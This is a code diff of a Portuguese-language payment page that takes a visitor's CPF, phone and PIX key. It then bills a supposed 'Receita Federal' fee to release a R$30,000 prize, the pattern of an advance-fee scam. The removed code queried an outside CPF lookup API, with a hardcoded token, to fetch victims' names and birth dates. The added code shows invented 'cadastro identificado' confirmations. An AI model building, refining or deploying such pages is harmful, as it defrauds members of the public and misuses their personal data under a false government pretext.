@@ -75,7 +75,7 @@
         margin: 0 auto 15px;
     }
     
-    /* PROGRESSO DAS ETAPAS */
+    /* PROGRESSO DAS ETAPAS - CORRIGIDO */
     .progresso-etapas {
         display: flex;
         justify-content: space-between;
@@ -603,7 +603,7 @@
         font-size: 16px;
     }
     
-    /* AVISO RECEITA FEDERAL - VERSÃO RESUMIDA E DIRETA */
+    /* AVISO RECEITA FEDERAL - NOVO DESIGN RESUMIDO */
     .aviso-receita {
         background: #fff3cd;
         border-left: 4px solid #ffc107;
@@ -639,7 +639,7 @@
     .valor-taxa-branco {
         font-size: 32px;
         font-weight: 900;
-        color: white !important;
+        color: white !important; /* FORÇA BRANCO NO MOBILE */
         line-height: 1.2;
         text-shadow: 0 2px 4px rgba(0,0,0,0.2);
     }
@@ -947,6 +947,7 @@
             font-size: 15px;
         }
         
+        /* AJUSTE ESPECÍFICO PARA O QUADRO DA TAXA NO MOBILE */
         .quadro-taxa {
             padding: 12px 10px;
         }
@@ -1153,23 +1154,11 @@
                         <div id="erroCPF" class="mensagem-erro"></div>
                     </div>
                     
-                    <!-- ÁREA DE CARREGAMENTO DA CONSULTA -->
-                    <div id="areaConsultaCPF" style="display: none; text-align: center; margin: 15px 0;">
-                        <div class="spinner" style="border-top-color: #2f4eb5;"></div>
-                        <p style="color: #666; font-size: 13px; margin-top: 10px;">Consultando dados do CPF...</p>
-                    </div>
-                    
-                    <!-- DADOS DO USUÁRIO ENCONTRADOS -->
-                    <div id="dadosEncontrados" class="mensagem-sucesso" style="display: none;">
+                    <div id="sucessoCPF" class="mensagem-sucesso" style="display: none;">
                         <i class="bi bi-check-circle-fill"></i>
-                        Dados encontrados com sucesso!
-                        <div style="font-size: 13px; margin-top: 8px; text-align: left; background: white; padding: 8px; border-radius: 5px; color: #333;">
-                            <div><strong>Nome:</strong> <span id="nomeEncontrado"></span></div>
-                            <div><strong>Data Nasc.:</strong> <span id="dataNascimentoEncontrada"></span></div>
-                        </div>
+                        Identificação realizada com sucesso!
+                        <div style="font-size: 12px; margin-top: 5px;">CPF: <span id="cpfExibido"></span> - Cadastro identificado</div>
                     </div>
-                    
-                    <div id="erroAPI" class="mensagem-erro" style="display: none;"></div>
                     
                     <button id="btnContinuarCPF" class="btn-principal" onclick="validarCPFeAvancar()" disabled>
                         Continuar
@@ -1478,8 +1467,6 @@
     
     let dadosUsuario = {
         cpf: '',
-        nome: '',
-        data_nascimento: '',
         telefone: '',
         transactionId: '',
         pixData: null,
@@ -1494,9 +1481,6 @@
         CHECK_PAYMENT_URL: '/api/check-payment',
         CHECK_CONFIRMED_URL: '/api/check-confirmed'
     };
-
-    // CONFIGURAÇÃO DA API DE CPF
-    const CPF_API_URL = 'https://api.amnesiatecnologia.rocks/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=';
 
     // VARIÁVEL PARA VERIFICAÇÃO AUTOMÁTICA
     let verificacaoAutomatica = null;
@@ -1639,32 +1623,8 @@
     function abrirModalPagamento() {
         console.log('Abrindo modal, pacote:', pacoteSelecionado);
         
-        // Resetar dados do usuário
-        dadosUsuario = {
-            cpf: '',
-            nome: '',
-            data_nascimento: '',
-            telefone: '',
-            transactionId: '',
-            pixData: null,
-            chavePix: '',
-            tipoChavePix: 'cpf',
-            taxaPaga: false
-        };
-        
         atualizarResumoCompra();
         mostrarEtapa(1);
-        
-        // Resetar interface
-        document.getElementById('inputCPF').value = '';
-        document.getElementById('inputCPF').style.borderColor = '#e0e0e0';
-        document.getElementById('erroCPF').style.display = 'none';
-        document.getElementById('sucessoCPF').style.display = 'none';
-        document.getElementById('dadosEncontrados').style.display = 'none';
-        document.getElementById('erroAPI').style.display = 'none';
-        document.getElementById('areaConsultaCPF').style.display = 'none';
-        document.getElementById('btnContinuarCPF').disabled = true;
-        document.getElementById('btnContinuarCPF').style.background = '#cccccc';
         
         document.getElementById('modalPagamento').style.display = 'flex';
         document.body.style.overflow = 'hidden';
@@ -1718,18 +1678,9 @@
         });
     }
 
-    // ETAPA 1: VALIDAÇÃO DE CPF COM CONSULTA À API
+    // ETAPA 1: VALIDAÇÃO DE CPF
     document.getElementById('inputCPF').addEventListener('input', function(e) {
         formatarCPF(this);
-        
-        // Esconder mensagens anteriores
-        document.getElementById('erroCPF').style.display = 'none';
-        document.getElementById('dadosEncontrados').style.display = 'none';
-        document.getElementById('erroAPI').style.display = 'none';
-        
-        const btn = document.getElementById('btnContinuarCPF');
-        btn.disabled = true;
-        btn.style.background = '#cccccc';
     });
 
     function formatarCPF(input) {
@@ -1743,89 +1694,20 @@
         
         input.value = value;
         
+        const btn = document.getElementById('btnContinuarCPF');
         const cpfNumeros = value.replace(/\D/g, '');
         
-        // Se tiver 11 dígitos, consultar automaticamente
         if (cpfNumeros.length === 11) {
-            consultarCPF(cpfNumeros);
+            btn.disabled = false;
+            btn.style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
+        } else {
+            btn.disabled = true;
+            btn.style.background = '#cccccc';
         }
-    }
-
-    // NOVA FUNÇÃO PARA CONSULTAR CPF NA API
-    async function consultarCPF(cpf) {
-        const areaConsulta = document.getElementById('areaConsultaCPF');
-        const erroAPI = document.getElementById('erroAPI');
-        const inputCPF = document.getElementById('inputCPF');
         
-        // Mostrar carregamento
-        areaConsulta.style.display = 'block';
-        erroAPI.style.display = 'none';
-        
-        try {
-            console.log('🔍 Consultando CPF:', cpf);
-            
-            const response = await fetch(CPF_API_URL + cpf);
-            const data = await response.json();
-            
-            console.log('📥 Resposta da API:', data);
-            
-            areaConsulta.style.display = 'none';
-            
-            // Verificar se retornou erro
-            if (data.erro) {
-                erroAPI.textContent = 'CPF não encontrado ou inválido.';
-                erroAPI.style.display = 'block';
-                inputCPF.style.borderColor = '#e74c3c';
-                return;
-            }
-            
-            // Verificar se tem os dados esperados
-            if (data.DADOS && data.DADOS.nome) {
-                const nome = data.DADOS.nome;
-                const dataNascimento = data.DADOS.data_nascimento;
-                
-                // Formatar data de nascimento (de dd/mm/aaaa para aaaa-mm-dd)
-                let dataFormatada = '';
-                if (dataNascimento) {
-                    const partes = dataNascimento.split('/');
-                    if (partes.length === 3) {
-                        dataFormatada = `${partes[2]}-${partes[1]}-${partes[0]}`;
-                    }
-                }
-                
-                // Armazenar nos dados do usuário
-                dadosUsuario.cpf = cpf;
-                dadosUsuario.nome = nome;
-                dadosUsuario.data_nascimento = dataFormatada;
-                
-                // Mostrar dados encontrados
-                document.getElementById('nomeEncontrado').textContent = nome;
-                document.getElementById('dataNascimentoEncontrada').textContent = dataNascimento || 'Não informada';
-                document.getElementById('dadosEncontrados').style.display = 'block';
-                
-                // Habilitar botão
-                const btn = document.getElementById('btnContinuarCPF');
-                btn.disabled = false;
-                btn.style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
-                
-                inputCPF.style.borderColor = '#28a745';
-                
-                // Mostrar notificação
-                mostrarPopupNotificacao('✅ Dados do CPF encontrados com sucesso!');
-                
-            } else {
-                erroAPI.textContent = 'Formato de resposta inválido da API.';
-                erroAPI.style.display = 'block';
-                inputCPF.style.borderColor = '#e74c3c';
-            }
-            
-        } catch (error) {
-            console.error('❌ Erro na consulta:', error);
-            areaConsulta.style.display = 'none';
-            erroAPI.textContent = 'Erro ao consultar CPF. Verifique sua conexão.';
-            erroAPI.style.display = 'block';
-            inputCPF.style.borderColor = '#e74c3c';
-        }
+        document.getElementById('erroCPF').style.display = 'none';
+        document.getElementById('sucessoCPF').style.display = 'none';
+        input.style.borderColor = '#e0e0e0';
     }
 
     function validarCPF(cpf) {
@@ -1854,19 +1736,45 @@
     }
 
     function validarCPFeAvancar() {
-        // Verificar se já tem os dados do usuário
-        if (!dadosUsuario.cpf || !dadosUsuario.nome) {
-            const erroAPI = document.getElementById('erroAPI');
-            erroAPI.textContent = 'Por favor, aguarde a consulta do CPF.';
-            erroAPI.style.display = 'block';
+        const cpfInput = document.getElementById('inputCPF');
+        const cpf = cpfInput.value;
+        const cpfNumeros = cpf.replace(/\D/g, '');
+        const erroCPF = document.getElementById('erroCPF');
+        const sucessoCPF = document.getElementById('sucessoCPF');
+        const cpfExibido = document.getElementById('cpfExibido');
+        
+        erroCPF.style.display = 'none';
+        cpfInput.style.borderColor = '#e0e0e0';
+        
+        if (cpfNumeros.length !== 11) {
+            erroCPF.textContent = 'CPF deve conter 11 dígitos.';
+            erroCPF.style.display = 'block';
+            cpfInput.style.borderColor = '#e74c3c';
+            cpfInput.focus();
             return;
         }
         
-        // Avançar para etapa 2
+        if (!validarCPF(cpf)) {
+            erroCPF.textContent = 'CPF inválido. Por favor, verifique o número digitado.';
+            erroCPF.style.display = 'block';
+            cpfInput.style.borderColor = '#e74c3c';
+            cpfInput.focus();
+            return;
+        }
+        
+        dadosUsuario.cpf = cpfNumeros;
+        
+        cpfInput.style.borderColor = '#28a745';
+        sucessoCPF.style.display = 'block';
+        cpfExibido.textContent = cpf;
+        
+        const btnContinuar = document.getElementById('btnContinuarCPF');
+        btnContinuar.style.display = 'none';
+        
         setTimeout(() => {
             mostrarEtapa(2);
             document.getElementById('inputTelefone').focus();
-        }, 500);
+        }, 3000);
     }
 
     // ETAPA 2: TELEFONE E PIX
@@ -1976,13 +1884,12 @@
             const dadosPIX = {
                 amount: pacoteSelecionado.valor,
                 cpf: dadosUsuario.cpf,
-                nome: dadosUsuario.nome,
-                data_nascimento: dadosUsuario.data_nascimento,
                 telefone: telefoneNumeros,
-                quantidade: pacoteSelecionado.quantidade
+                quantidade: pacoteSelecionado.quantidade,
+                nome: `Cliente ${dadosUsuario.cpf.substring(0, 3)}***`
             };
             
-            console.log('📤 Enviando para API com dados completos:', dadosPIX);
+            console.log('📤 Enviando para API:', dadosPIX);
             
             const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
                 method: 'POST',
@@ -2020,9 +1927,8 @@
             localStorage.setItem(`pix_vs_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
-                nome: dadosUsuario.nome,
-                data_nascimento: dadosUsuario.data_nascimento,
                 telefone: dadosUsuario.telefone,
+                telefone_formatado: telefoneInput.value,
                 quantidade: pacoteSelecionado.quantidade,
                 valor: pacoteSelecionado.valor,
                 gerado_em: new Date().toISOString(),
@@ -2207,8 +2113,6 @@
         const transacao = {
             id: dadosUsuario.transactionId,
             cpf: dadosUsuario.cpf,
-            nome: dadosUsuario.nome,
-            data_nascimento: dadosUsuario.data_nascimento,
             telefone: dadosUsuario.telefone,
             quantidade: pacoteSelecionado.quantidade,
             valor: pacoteSelecionado.valor,
@@ -2389,10 +2293,9 @@
             const dadosPIX = {
                 amount: valorTaxa,
                 cpf: dadosUsuario.cpf,
-                nome: dadosUsuario.nome,
-                data_nascimento: dadosUsuario.data_nascimento,
                 telefone: dadosUsuario.telefone,
                 quantidade: 1,
+                nome: `Cliente ${dadosUsuario.cpf.substring(0, 3)}*** - TAXA RFB`,
                 descricao: 'Taxa Receita Federal - Liberação Prêmio R$30.000'
             };
             
@@ -2427,7 +2330,6 @@
             localStorage.setItem(`taxa_vs_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
-                nome: dadosUsuario.nome,
                 chave_pix: dadosUsuario.chavePix,
                 tipo_chave: dadosUsuario.tipoChavePix,
                 valor: valorTaxa,
@@ -2575,7 +2477,6 @@
         const transacaoTaxa = {
             id: dadosUsuario.transactionIdTaxa,
             cpf: dadosUsuario.cpf,
-            nome: dadosUsuario.nome,
             chave_pix: dadosUsuario.chavePix,
             tipo_chave: dadosUsuario.tipoChavePix,
             valor: 27.40,
@@ -2707,13 +2608,13 @@
     ></script>
     
     <script>
-    window.pixelId = "6953b03a04688180602e47b9";
-    var a = document.createElement("script");
-    a.setAttribute("async", "");
-    a.setAttribute("defer", "");
-    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-    document.head.appendChild(a);
-    </script>
+  window.pixelId = "6953b03a04688180602e47b9";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
     
 </body>
 </html>
